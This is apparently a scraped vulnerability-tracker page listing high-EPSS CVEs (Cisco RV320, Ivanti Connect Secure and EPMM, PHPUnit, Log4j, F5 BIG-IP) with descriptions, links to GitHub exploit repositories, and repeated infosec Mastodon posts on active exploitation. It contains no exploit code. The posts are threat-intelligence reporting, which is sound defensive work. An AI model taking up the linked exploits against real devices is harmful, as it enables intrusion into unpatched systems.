CVE-2019-1653
(7.5 HIGH)

EPSS: 97.56%

2 posts

A vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an unauthenticated, remote attacker to retrieve sensitive information. The vulnerability is due to improper access controls for URLs. An attacker could exploit this vulnerability by connecting to an affected device via HTTP or HTTPS and requesting specific URLs. A

6 repos

https://github.com/ibrahimzx/CVE-2019-1653

https://github.com/S3ntinelX/nmap-scripts

https://github.com/shaheemirza/CiscoSpill

https://github.com/dubfr33/CVE-2019-1653

https://github.com/k8gege/CiscoExploit

https://github.com/0x27/CiscoRV320Dump

simontsui at 2024-01-11T15:49:37.695Z ##

Security Week: China-Linked Volt Typhoon Hackers Possibly Targeting Australian, UK Governments. Chinese state-sponsored hackers are targeting old vulnerabilities in Cisco routers in new attacks apparently aimed at government entities in the US, UK, and Australia, cybersecurity firm SecurityScorecard reports. As part of the observed attacks, the adversaries exploited CVE-2019-1653 and CVE-2019-1652, two critical-severity bugs in discontinued Cisco small business RV320/325 VPN routers, which have been targeted by Chinese hackers before and are also featured in CISAâ€™s KEV catalog.
ðŸ”— https://www.securityweek.com/china-linked-volt-typhoon-hackers-possibly-targeting-australian-uk-governments/

##
simontsui@infosec.exchange at 2024-01-11T15:49:37.000Z ##

Security Week: China-Linked Volt Typhoon Hackers Possibly Targeting Australian, UK Governments. Chinese state-sponsored hackers are targeting old vulnerabilities in Cisco routers in new attacks apparently aimed at government entities in the US, UK, and Australia, cybersecurity firm SecurityScorecard reports. As part of the observed attacks, the adversaries exploited CVE-2019-1653 and CVE-2019-1652, two critical-severity bugs in discontinued Cisco small business RV320/325 VPN routers, which have been targeted by Chinese hackers before and are also featured in CISAâ€™s KEV catalog.
ðŸ”— https://www.securityweek.com/china-linked-volt-typhoon-hackers-possibly-targeting-australian-uk-governments/

##

CVE-2021-36260
(9.8 CRITICAL)

EPSS: 97.48%

4 posts

A command injection vulnerability in the web server of some Hikvision product. Due to the insufficient input validation, attacker can exploit the vulnerability to launch a command injection attack by sending some messages with malicious commands.

9 repos

simontsui at 2024-01-18T15:13:57.426Z ##

VulnCheck wrote about 7777-Botnet with the following information:

  • 7777-Botnet remains active, and VulnCheck used co-located services to theorize the botnet is infecting TP-Link, Xiongmai, and Hikvision devices using CVE-2017-7577, CVE-2018-10088, CVE-2022-45460, CVE-2021-36260, and/or CVE-2022-24355.
  • The botnet also appears to infect other systems like MVPower, Zyxel NAS, and GitLab, although at a very low volume.
  • The botnet doesnâ€™t just start a service on port 7777. It also spins up a SOCKS5 server on port 11228.

ðŸ”— https://vulncheck.com/blog/ip-intel-7777-botnet

CVE-2017-9841
(9.8 CRITICAL)

EPSS: 97.48%

4 posts

Util/PHP/eval-stdin.php in PHPUnit before 4.8.28 and 5.x before 5.6.3 allows remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a "

H3liumb0y at 2024-01-18T10:13:54.148Z ##

"âš ï¸ Alert: Androxgh0st Botnet Targets AWS & Microsoft Credentials! ðŸš¨"

The cybersecurity realm is on high alert with the emergence of Androxgh0st, a botnet malware exploiting vulnerabilities to steal AWS and Microsoft credentials. It's a Python-scripted threat, targeting sensitive .env files and leveraging SMTP for credential scanning and web shell deployment. Key vulnerabilities exploited include CVE-2017-9841, CVE-2018-15133, and CVE-2021-41773, allowing remote code execution and file uploads. This critical development warrants immediate attention and proactive defense strategies.

Tags: #CyberSecurity #Botnet #Androxgh0st #Vulnerability #AWS #Microsoft #SMTP #PHP #CVE20179841 #CVE201815133 #CVE202141773 #RemoteCodeExecution #CyberAttack

Sources:

  • "Androxgh0st Botnet Malware Steals AWS, Microsoft Credentials" by Tushar Subhra Dutta on GBHackers. https://gbhackers.com/androxgh0st-botnet-malware/
  • "US Gov Issues Warning for Androxgh0st Malware Attacks" by Ionut Arghire on SecurityWeek. https://www.securityweek.com/us-gov-issues-warning-for-androxgh0st-malware-attacks/

Mitre - CVE-2017-9841
Mitre - CVE-2018-15133
Mitre - CVE-2021-41773

##
simontsui at 2024-01-16T17:14:18.401Z ##

Vulnerabilities mentioned in this CISA cybersecurity advisory:

  • CVE-2017-9841 (9.8 critical, disclosed 27 June 2017, added to CISA KEV Catalog 15 February 2022) arbitrary PHP code execution in PHPUnit
  • CVE-2018-15133 (8.1 high, disclosed 09 August 2018, added to KEV 16 January 2024) Laravel Deserialization of Untrusted Data Vulnerability (RCE)
  • CVE-2021-41773 (7.5 high, disclosed 05 October 2021, added to KEV 03 November 2021) Apache HTTP Server Path Traversal Vulnerability (RCE)

#CVE201815133 #KEV #vulnerability #CVE20179841 #CVE202141773 #eitw #activeexploitation

##
H3liumb0y@infosec.exchange at 2024-01-18T10:13:54.000Z ##

"âš ï¸ Alert: Androxgh0st Botnet Targets AWS & Microsoft Credentials! ðŸš¨"

The cybersecurity realm is on high alert with the emergence of Androxgh0st, a botnet malware exploiting vulnerabilities to steal AWS and Microsoft credentials. It's a Python-scripted threat, targeting sensitive .env files and leveraging SMTP for credential scanning and web shell deployment. Key vulnerabilities exploited include CVE-2017-9841, CVE-2018-15133, and CVE-2021-41773, allowing remote code execution and file uploads. This critical development warrants immediate attention and proactive defense strategies.

simontsui@infosec.exchange at 2024-01-16T17:14:18.000Z ##

Vulnerabilities mentioned in this CISA cybersecurity advisory:

  • CVE-2017-9841 (9.8 critical, disclosed 27 June 2017, added to CISA KEV Catalog 15 February 2022) arbitrary PHP code execution in PHPUnit
  • CVE-2018-15133 (8.1 high, disclosed 09 August 2018, added to KEV 16 January 2024) Laravel Deserialization of Untrusted Data Vulnerability (RCE)
  • CVE-2021-41773 (7.5 high, disclosed 05 October 2021, added to KEV 03 November 2021) Apache HTTP Server Path Traversal Vulnerability (RCE)

CVE-2020-0796
(10.0 CRITICAL)

EPSS: 97.48%

1 posts

A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests, aka 'Windows SMBv3 Client/Server Remote Code Execution Vulnerability'.

##

CVE-2019-1652
(7.2 HIGH)

EPSS: 97.47%

2 posts

A vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an authenticated, remote attacker with administrative privileges on an affected device to execute arbitrary commands. The vulnerability is due to improper validation of user-supplied input. An attacker could exploit this vulnerability by sending malicious HTTP POST

1 repos

https://github.com/0x27/CiscoRV320Dump

simontsui at 2024-01-11T15:49:37.695Z ##

Security Week: China-Linked Volt Typhoon Hackers Possibly Targeting Australian, UK Governments. Chinese state-sponsored hackers are targeting old vulnerabilities in Cisco routers in new attacks apparently aimed at government entities in the US, UK, and Australia, cybersecurity firm SecurityScorecard reports. As part of the observed attacks, the adversaries exploited CVE-2019-1653 and CVE-2019-1652, two critical-severity bugs in discontinued Cisco small business RV320/325 VPN routers, which have been targeted by Chinese hackers before and are also featured in CISAâ€™s KEV catalog.
ðŸ”— https://www.securityweek.com/china-linked-volt-typhoon-hackers-possibly-targeting-australian-uk-governments/

CVE-2021-45046
(9.0 None)

EPSS: 97.43%

2 posts

# Impact The fix to address [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allow attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Ma

CVE-2021-22986
(9.8 CRITICAL)

EPSS: 97.42%

4 posts

On BIG-IP versions 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x before 14.1.4, 13.1.x before 13.1.3.6, and 12.1.x before 12.1.5.3 amd BIG-IQ 7.1.0.x before 7.1.0.3 and 7.0.0.x before 7.0.0.2, the iControl REST interface has an unauthenticated remote command execution vulnerability. Note: Software versions which have reached End of Software Development (EoSD) are not evaluated.

simontsui at 2024-01-22T15:41:06.045Z ##

Ron Bowes @iagox86 of @greynoise blogs about the Confusing History of F5 BIG-IP RCE Vulnerabilities, stemming from a unidentified shell-injection attack against the filePath parameter in the F5 BIG-IP login page. This turned out to be CVE-2021-23015, but the path to figuring that out is an interesting read.
ðŸ”— https://www.labs.greynoise.io/grimoire/2024-01-14-f5-rce-explained/

#F5 #BIGIP #vulnerability #CVE202122986 #SSRF #CVE20221388 #CVE202123015 #RCE #CVE202241800 #GreyNoise

##
simontsui at 2024-01-22T15:41:06.045Z ##

Ron Bowes @iagox86 of @greynoise blogs about the Confusing History of F5 BIG-IP RCE Vulnerabilities, stemming from a unidentified shell-injection attack against the filePath parameter in the F5 BIG-IP login page. This turned out to be CVE-2021-23015, but the path to figuring that out is an interesting read.
ðŸ”— https://www.labs.greynoise.io/grimoire/2024-01-14-f5-rce-explained/

#F5 #BIGIP #vulnerability #CVE202122986 #SSRF #CVE20221388 #CVE202123015 #RCE #CVE202241800 #GreyNoise

##
simontsui@infosec.exchange at 2024-01-22T15:41:06.000Z ##

Ron Bowes @iagox86 of @greynoise blogs about the Confusing History of F5 BIG-IP RCE Vulnerabilities, stemming from a unidentified shell-injection attack against the filePath parameter in the F5 BIG-IP login page. This turned out to be CVE-2021-23015, but the path to figuring that out is an interesting read.
ðŸ”— https://www.labs.greynoise.io/grimoire/2024-01-14-f5-rce-explained/

#F5 #BIGIP #vulnerability #CVE202122986 #SSRF #CVE20221388 #CVE202123015 #RCE #CVE202241800 #GreyNoise

##

CVE-2021-41773
(7.5 HIGH)

EPSS: 97.39%

8 posts

A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known

100 repos

H3liumb0y at 2024-01-18T10:13:54.148Z ##

"âš ï¸ Alert: Androxgh0st Botnet Targets AWS & Microsoft Credentials! ðŸš¨"

The cybersecurity realm is on high alert with the emergence of Androxgh0st, a botnet malware exploiting vulnerabilities to steal AWS and Microsoft credentials. It's a Python-scripted threat, targeting sensitive .env files and leveraging SMTP for credential scanning and web shell deployment. Key vulnerabilities exploited include CVE-2017-9841, CVE-2018-15133, and CVE-2021-41773, allowing remote code execution and file uploads. This critical development warrants immediate attention and proactive defense strategies.

Tags: #CyberSecurity #Botnet #Androxgh0st #Vulnerability #AWS #Microsoft #SMTP #PHP #CVE20179841 #CVE201815133 #CVE202141773 #RemoteCodeExecution #CyberAttack

Sources:

  • "Androxgh0st Botnet Malware Steals AWS, Microsoft Credentials" by Tushar Subhra Dutta on GBHackers. https://gbhackers.com/androxgh0st-botnet-malware/
  • "US Gov Issues Warning for Androxgh0st Malware Attacks" by Ionut Arghire on SecurityWeek. https://www.securityweek.com/us-gov-issues-warning-for-androxgh0st-malware-attacks/

Mitre - CVE-2017-9841
Mitre - CVE-2018-15133
Mitre - CVE-2021-41773

##
simontsui at 2024-01-16T17:14:18.401Z ##

Vulnerabilities mentioned in this CISA cybersecurity advisory:

  • CVE-2017-9841 (9.8 critical, disclosed 27 June 2017, added to CISA KEV Catalog 15 February 2022) arbitrary PHP code execution in PHPUnit
  • CVE-2018-15133 (8.1 high, disclosed 09 August 2018, added to KEV 16 January 2024) Laravel Deserialization of Untrusted Data Vulnerability (RCE)
  • CVE-2021-41773 (7.5 high, disclosed 05 October 2021, added to KEV 03 November 2021) Apache HTTP Server Path Traversal Vulnerability (RCE)

#CVE201815133 #KEV #vulnerability #CVE20179841 #CVE202141773 #eitw #activeexploitation

CVE-2022-1388
(9.8 CRITICAL)

EPSS: 97.32%

2 posts

On F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, undisclosed requests may bypass iControl REST authentication. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated

CVE-2017-5487
(5.3 MEDIUM)

EPSS: 97.18%

2 posts

wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php in the REST API implementation in WordPress 4.7 before 4.7.1 does not properly restrict listings of post authors, which allows remote attackers to obtain sensitive information via a wp-json/wp/v2/users request.

9 repos

https://github.com/Ravindu-Priyankara/CVE-2017-5487-vulnerability-on-NSBM

https://github.com/SeasonLeague/CVE-2017-5487

https://github.com/K3ysTr0K3R/CVE-2017-5487-EXPLOIT

https://github.com/teambugsbunny/wpUsersScan

https://github.com/anx0ing/Wordpress_Brute

https://github.com/zkhalidul/GrabberWP-CVE-2017-5487

https://github.com/patilkr/wp-CVE-2017-5487-exploit

https://github.com/GeunSam2/CVE-2017-5487

https://github.com/R3K1NG/wpUsersScan

CVE-2024-21887
(9.1 CRITICAL)

EPSS: 95.69%

76 posts

A command injection vulnerability in web components of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) allows an authenticated administrator to send specially crafted requests and execute arbitrary commands on the appliance.

10 repos

https://github.com/Chocapikk/CVE-2024-21887

https://github.com/mickdec/CVE-2023-46805_CVE-2024-21887_scan_grouped

https://github.com/oways/ivanti-CVE-2024-21887

https://github.com/raminkarimkhani1996/CVE-2023-46805_CVE-2024-21887

https://github.com/seajaysec/Ivanti-Connect-Around-Scan

https://github.com/yoryio/CVE-2023-46805

jos1264@social.skynetcloud.site at 2024-01-19T21:50:02.000Z ##

CISA Issues Emergency Directive on Ivanti Zero-Days https://www.securityweek.com/cisa-issues-emergency-directive-on-ivanti-zero-days/ #Malware&Threats #Vulnerabilities #CVE202346805 #CVE202421887 #Volexity #Ivanti #CISA

##
simontsui at 2024-01-19T18:33:09.934Z ##

CISA issues Emergency Directive 24-01: Mitigate Ivanti Connect Secure and Ivanti Policy Secure Vulnerabilities in response to CVE-2023-46805 (8.2 high, disclosed by Ivanti on 10 January 2024 as exploited zero-days) authentication bypass in Ivanti Connect Secure VPN Version 9.x and 22.x and CVE-2024-21887 (9.1 critical) command injection in Ivanti Connect Secure VPN Version 9.x and 22.x

ðŸ”— https://www.cisa.gov/news-events/directives/ed-24-01-mitigate-ivanti-connect-secure-and-ivanti-policy-secure-vulnerabilities

simontsui at 2024-01-19T15:56:27.654Z ##

ðŸ”— https://www.greynoise.io/blog/ivanti-connect-secure-exploited-to-install-cryptominers

##
simontsui at 2024-01-19T12:14:15.521Z ##

AssetNote documents the process they took in reverse engineering the Ivanti Connect Secure vulnerabilities CVE-2023-46805 (Authentication Bypass) & CVE-2024-21887 (Remote Command Execution), as well as understanding potential gaps in other detection mechanisms and exploit payloads that were published. They gave a shoutout to Ron Bowes @iagox86 at @greynoise
ðŸ”— https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce

#AssetNote #Ivanti #ConnectSecure #zeroday #CVE202346805 #CVE202421887 #eitw #KEV #KnownExploitedVulnerabilitiesCatalog #activeexploitation

##
H3liumb0y at 2024-01-16T08:25:06.984Z ##

"ðŸš¨ Ivanti VPN Zero-Day Exploits Unleash Global Cyber Onslaught ðŸš¨"

ðŸ”’ Two zero-day vulnerabilities in Ivanti's Connect Secure VPN and Policy Secure network access control (NAC) appliances are facing mass exploitation. Discovered by Volexity, the CVE-2023-46805 and CVE-2024-21887 vulnerabilities enable widespread attacks, impacting businesses of all sizes worldwide, including Fortune 500 companies. The GIFTEDVISITOR webshell variant is used to backdoor systems, indicating a serious threat level.

Ivanti hasn't released patches yet. Administrators are advised to apply vendor-provided mitigation measures and use Ivanti's Integrity Checker Tool. All data on compromised ICS VPN appliances should be considered at risk. Amid these attacks, suspected Chinese state-backed actors (UTA0178 or UNC5221) are notably active, with Mandiant identifying five custom malware strains targeting breached systems.

These include Zipline Passive Backdoor, Thinspool Dropper, Wirefire and Lightwire web shells, Warpwire harvester, PySoxy tunneler, BusyBox, and Thinspool utility. Particularly alarming is Zipline, which intercepts network traffic and supports various malicious activities.

Stay vigilant and prioritize immediate protective actions!

ðŸ”— Source: BleepingComputer - Sergiu Gatlan

Tags: #CyberSecurity #ZeroDay #IvantiVPN #CVE202346805 #CVE202421887 #APT #UTA0178 #UNC5221 #Malware #Webshell #Volexity #Mandiant #NetworkSecurity #InfoSecðŸ›¡ï¸ðŸŒðŸ‘¾

##
simontsui at 2024-01-16T01:17:49.542Z ##

Volexity reports the following about CVE-2023-46805 and CVE-2024-21887:

  • Exploitation of these vulnerabilities is now widespread. Volexity has been able to find evidence of compromise of over 1,700 devices worldwide.
  • Additional threat actors beyond UTA0178 appear to now have access to the exploit and are actively trying to exploit devices.

ðŸ”— https://www.volexity.com/blog/2024/01/15/ivanti-connect-secure-vpn-exploitation-goes-global/

#Ivanti #zeroday #eitw #vulnerability #CVE202346805 #CVE202421887 #KEV

ðŸ”— https://www.cisa.gov/news-events/directives/ed-24-01-mitigate-ivanti-connect-secure-and-ivanti-policy-secure-vulnerabilities

The GIFTEDVISITOR webshell variant is used to backdoor systems, indicating a serious threat level.

Ivanti hasn't released patches yet. Administrators are advised to apply vendor-provided mitigation measures and use Ivanti's Integrity Checker Tool. All data on compromised ICS VPN appliances should be considered at risk. Amid these attacks, suspected Chinese state-backed actors (UTA0178 or UNC5221) are notably active, with Mandiant identifying five custom malware strains targeting breached systems.

These include Zipline Passive Backdoor, Thinspool Dropper, Wirefire and Lightwire web shells, Warpwire harvester, PySoxy tunneler, BusyBox, and Thinspool utility. Particularly alarming is Zipline, which intercepts network traffic and supports various malicious activities.

H3liumb0y at 2024-01-16T08:25:06.984Z ##

"ðŸš¨ Ivanti VPN Zero-Day Exploits Unleash Global Cyber Onslaught ðŸš¨"

ðŸ”’ Two zero-day vulnerabilities in Ivanti's Connect Secure VPN and Policy Secure network access control (NAC) appliances are facing mass exploitation. Discovered by Volexity, the CVE-2023-46805 and CVE-2024-21887 vulnerabilities enable widespread attacks, impacting businesses of all sizes worldwide, including Fortune 500 companies. The GIFTEDVISITOR webshell variant is used to backdoor systems, indicating a serious threat level.

Ivanti hasn't released patches yet. Administrators are advised to apply vendor-provided mitigation measures and use Ivanti's Integrity Checker Tool. All data on compromised ICS VPN appliances should be considered at risk. Amid these attacks, suspected Chinese state-backed actors (UTA0178 or UNC5221) are notably active, with Mandiant identifying five custom malware strains targeting breached systems.

These include Zipline Passive Backdoor, Thinspool Dropper, Wirefire and Lightwire web shells, Warpwire harvester, PySoxy tunneler, BusyBox, and Thinspool utility. Particularly alarming is Zipline, which intercepts network traffic and supports various malicious activities.

Stay vigilant and prioritize immediate protective actions!

Ivanti hasn't released patches yet. Administrators are advised to apply vendor-provided mitigation measures and use Ivanti's Integrity Checker Tool. All data on compromised ICS VPN appliances should be considered at risk. Amid these attacks, suspected Chinese state-backed actors (UTA0178 or UNC5221) are notably active, with Mandiant identifying five custom malware strains targeting breached systems.

These include Zipline Passive Backdoor, Thinspool Dropper, Wirefire and Lightwire web shells, Warpwire harvester, PySoxy tunneler, BusyBox, and Thinspool utility. Particularly alarming is Zipline, which intercepts network traffic and supports various malicious activities.

##
h4sh at 2024-01-14T00:00:06.354Z ##

Since #Ivanti hasn't released a patch yet for the #pulsesecure #vpn CVE-2023-46805 & CVE-2024-21887, I have made a nuclei template for scanning whether or not their mitigation XML file has been applied:

https://github.com/projectdiscovery/nuclei-templates/pull/8936

Thanks to @watchtowrcyber (come on, get a real mastodon account!) for their reverse engineering research to make this possible (https://labs.watchtowr.com/welcome-to-2024-the-sslvpn-chaos-continues-ivanti-cve-2023-46805-cve-2024-21887/)

##
simontsui at 2024-01-12T13:21:31.769Z ##

Mandiant published their own blog post regarding the active exploitation of Ivanti zero-days CVE-2023-46805 and CVE-2024-21887. They track the threat actor UTA0178 (Volexity's) as UNC5221, described as a suspected APT. They describe post-exploitation activity and identify custom malware. IOC and Yara rules provided.
ðŸ”— https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day

j0hnb3r00t at 2024-01-11T15:38:06.135Z ##

##
h4sh at 2024-01-10T23:50:49.041Z ##

The mitigation for the Ivanti ICS/IPS #ConnectAround bug is some XML file for now according to https://forums.ivanti.com/s/article/KB-CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US

If someone has a copy of that file can you send it to me to have a look?

The actual patch for the bug will be "staggered" across the next few weeks where exploitation by CN APTs will inevitably be much, much faster

##
simontsui at 2024-01-10T18:14:42.257Z ##

Ivanti zero-days: Ivanti Connect Secure (ICS), formerly known as Pulse Connect Secure and Ivanti Policy Secure gateways. "If CVE-2024-21887 is used in conjunction with CVE-2023-46805, exploitation does not require authentication and enables a threat actor to craft malicious requests and execute arbitrary commands on the system."

  • CVE-2023-46805 (8.2 high) authentication bypass
  • CVE-2024-21887 (9.1 critical) command injection

ðŸ”—

  • security advisory: https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US
  • blog post: https://www.ivanti.com/blog/security-update-for-ivanti-connect-secure-and-ivanti-policy-secure-gateways
  • knowledge base article: https://forums.ivanti.com/s/article/KB-CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US

People are calling them exploited zero-days. There is no patch available at this time: https://cyberplace.social/@GossiTheDog/111732557100241084

EDIT: Are you aware of any active exploitation of the vulnerability?
We are aware of less than 10 customers impacted by the vulnerabilities. We are unable to discuss the specifics of our customers.

campuscodi@mastodon.social at 2024-01-21T00:58:04.000Z ##

Security researchers from Assetnote have found new ways to exploit the recent Ivanti zero-days (CVE-2023-46805 & CVE-2024-21887) on older versions of the Connect Secure firmware.

https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce

According to GreyNoise, exploitation of these zero-days has extended from a Chinese APT to cryptomining botnets.

https://www.greynoise.io/blog/ivanti-connect-secure-exploited-to-install-cryptominers

Since #Ivanti hasn't released a patch yet for the #pulsesecure #vpn CVE-2023-46805 & CVE-2024-21887, I have made a nuclei template for scanning whether or not their mitigation XML file has been applied:

simontsui@infosec.exchange at 2024-01-12T13:21:31.000Z ##

Mandiant published their own blog post regarding the active exploitation of Ivanti zero-days CVE-2023-46805 and CVE-2024-21887. They track the threat actor UTA0178 (Volexity's) as UNC5221, described as a suspected APT. They describe post-exploitation activity and identify custom malware. IOC and Yara rules provided.

Ivanti zero-days: Ivanti Connect Secure (ICS), formerly known as Pulse Connect Secure and Ivanti Policy Secure gateways. "If CVE-2024-21887 is used in conjunction with CVE-2023-46805, exploitation does not require authentication and enables a threat actor to craft malicious requests and execute arbitrary commands on the system."

  • CVE-2023-46805 (8.2 high) authentication bypass
  • CVE-2024-21887 (9.1 critical) command injection

ðŸ”—

  • security advisory: https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US

#threatintel

##

CVE-2023-35078
(10.0 CRITICAL)

EPSS: 95.34%

2 posts

Ivanti Endpoint Manager Mobile (EPMM), formerly MobileIron Core, through 11.10 allows remote attackers to obtain PII, add an administrative account, and change the configuration because of an authentication bypass, as exploited in the wild in July 2023. A patch is available.

6 repos

https://github.com/emanueldosreis/nmap-CVE-2023-35078-Exploit

https://github.com/vchan-in/CVE-2023-35078-Exploit-POC

https://github.com/raytheon0x21/CVE-2023-35078

https://github.com/lager1/CVE-2023-35078

https://github.com/synfinner/CVE-2023-35078

https://github.com/Blue-number/CVE-2023-35078

simontsui at 2024-01-18T20:07:43.271Z ##

There's currently no public reference suggesting that CVE-2023-35082 was being exploited, so CISA may have received inside information from an affected organization. For more information on how CVE-2023-35082 relates to the previously disclosed Ivanti EPMM zero-days see the following excerpt:
"Since CVE-2023-35082 arises from the same place as CVE-2023-35078, specifically the permissive nature of certain entries in the mifs web applicationâ€™s security filter chain, Rapid7 would consider this new vulnerability a patch bypass for CVE-2023-35078."
Discovered by Rapid7: https://www.rapid7.com/blog/post/2023/08/02/cve-2023-35082-mobileiron-core-unauthenticated-api-access-vulnerability/

##
simontsui@infosec.exchange at 2024-01-18T20:07:43.000Z ##

There's currently no public reference suggesting that CVE-2023-35082 was being exploited, so CISA may have received inside information from an affected organization. For more information on how CVE-2023-35082 relates to the previously disclosed Ivanti EPMM zero-days see the following excerpt:
"Since CVE-2023-35082 arises from the same place as CVE-2023-35078, specifically the permissive nature of certain entries in the mifs web applicationâ€™s security filter chain, Rapid7 would consider this new vulnerability a patch bypass for CVE-2023-35078."
Discovered by Rapid7: https://www.rapid7.com/blog/post/2023/08/02/cve-2023-35082-mobileiron-core-unauthenticated-api-access-vulnerability/

##

CVE-2023-35082
(10.0 CRITICAL)

EPSS: 92.45%

8 posts

An authentication bypass vulnerability in Ivanti EPMM 11.10 and older, allows unauthorized users to access restricted functionality or resources of the application without proper authentication. This vulnerability is unique to CVE-2023-35078 announced earlier.

1 repos

https://github.com/Chocapikk/CVE-2023-35082

jos1264@social.skynetcloud.site at 2024-01-20T11:55:02.000Z ##

##
jos1264@social.skynetcloud.site at 2024-01-19T18:35:03.000Z ##

Ivanti EPMM and MobileIron Core vulnerability is actively exploited, CISA confirms (CVE-2023-35082) https://www.helpnetsecurity.com/2024/01/19/exploited-cve-2023-35082/ #endpointmanagement #vulnerability #Don'tmiss #GreyNoise #exploit #Ivanti #Rapid7 #News #CISA

##
zeljkazorz at 2024-01-19T16:36:34.326Z ##

@simontsui

Ivanti's Knowledge Base article for CVE-2023-35082 (https://forums.ivanti.com/s/article/KB-Remote-Unauthenticated-API-Access-Vulnerability-CVE-2023-35082?language=en_US) - ostensibly last updated on August 22, 2023 - states in the FAQ section that "Ivanti has been informed of exploitation by a few customers who have been exploited since the details were made publicly available by Rapid7."

Why hasn't CISA added CVE-2023-35082 to the KEV catalog in August 2023?

I don't know all the ways how CISA gets information about a specific vulnerability being actively exploited. Are (US-based) software companies required to share exploitation info with CISA? Does CISA rely on security advisories (and checking back for updates) for it? Do they rely on compromised organizations flagging vuln exploitation? (I have asked them and will hopefully get some answers.)

##
simontsui at 2024-01-18T20:07:43.271Z ##

There's currently no public reference suggesting that CVE-2023-35082 was being exploited, so CISA may have received inside information from an affected organization. For more information on how CVE-2023-35082 relates to the previously disclosed Ivanti EPMM zero-days see the following excerpt:
"Since CVE-2023-35082 arises from the same place as CVE-2023-35078, specifically the permissive nature of certain entries in the mifs web applicationâ€™s security filter chain, Rapid7 would consider this new vulnerability a patch bypass for CVE-2023-35078."
Discovered by Rapid7: https://www.rapid7.com/blog/post/2023/08/02/cve-2023-35082-mobileiron-core-unauthenticated-api-access-vulnerability/

CISA Adds One Known Exploited Vulnerability to Catalog: CVE-2023-35082 (9.8 critical) Ivanti Endpoint Manager Mobile (EPMM) and MobileIron Core Authentication Bypass Vulnerability
ðŸ”— https://www.cisa.gov/news-events/alerts/2024/01/18/cisa-adds-one-known-exploited-vulnerability-catalog

#CISA #KEV #activeexploitation #KnownExploitedVulnerabilitiesCatalog #CVE202335082 #Ivanti #eitw #EPMM #MobileIron

##
zeljkazorz@infosec.exchange at 2024-01-19T16:36:34.000Z ##

@simontsui

Ivanti's Knowledge Base article for CVE-2023-35082 (https://forums.ivanti.com/s/article/KB-Remote-Unauthenticated-API-Access-Vulnerability-CVE-2023-35082?language=en_US) - ostensibly last updated on August 22, 2023 - states in the FAQ section that "Ivanti has been informed of exploitation by a few customers who have been exploited since the details were made publicly available by Rapid7."

Why hasn't CISA added CVE-2023-35082 to the KEV catalog in August 2023?

I don't know all the ways how CISA gets information about a specific vulnerability being actively exploited. Are (US-based) software companies required to share exploitation info with CISA? Does CISA rely on security advisories (and checking back for updates) for it? Do they rely on compromised organizations flagging vuln exploitation? (I have asked them and will hopefully get some answers.)

##
simontsui@infosec.exchange at 2024-01-18T20:07:43.000Z ##

There's currently no public reference suggesting that CVE-2023-35082 was being exploited, so CISA may have received inside information from an affected organization. For more information on how CVE-2023-35082 relates to the previously disclosed Ivanti EPMM zero-days see the following excerpt:
"Since CVE-2023-35082 arises from the same place as CVE-2023-35078, specifically the permissive nature of certain entries in the mifs web applicationâ€™s security filter chain, Rapid7 would consider this new vulnerability a patch bypass for CVE-2023-35078."
Discovered by Rapid7: https://www.rapid7.com/blog/post/2023/08/02/cve-2023-35082-mobileiron-core-unauthenticated-api-access-vulnerability/

##
simontsui@infosec.exchange at 2024-01-18T19:46:47.000Z ##

CISA Adds One Known Exploited Vulnerability to Catalog: CVE-2023-35082 (9.8 critical) Ivanti Endpoint Manager Mobile (EPMM) and MobileIron Core Authentication Bypass Vulnerability
ðŸ”— https://www.cisa.gov/news-events/alerts/2024/01/18/cisa-adds-one-known-exploited-vulnerability-catalog

#CISA #KEV #activeexploitation #KnownExploitedVulnerabilitiesCatalog #CVE202335082 #Ivanti #eitw #EPMM #MobileIron

##

CVE-2023-46805
(8.2 HIGH)

EPSS: 92.41%

80 posts

An authentication bypass vulnerability in the web component of Ivanti ICS 9.x, 22.x and Ivanti Policy Secure allows a remote attacker to access restricted resources by bypassing control checks.

9 repos

https://github.com/mickdec/CVE-2023-46805_CVE-2024-21887_scan_grouped

https://github.com/cbeek-r7/CVE-2023-46805

https://github.com/raminkarimkhani1996/CVE-2023-46805_CVE-2024-21887

https://github.com/seajaysec/Ivanti-Connect-Around-Scan

https://github.com/yoryio/CVE-2023-46805

https://github.com/duy-31/CVE-2023-46805_CVE-2024-21887

https://github.com/Chocapikk/CVE-2023-46805

https://github.com/rxwx/pulse-meter

https://github.com/TheRedDevil1/Check-Vulns-Script

jos1264@social.skynetcloud.site at 2024-01-19T21:50:02.000Z ##

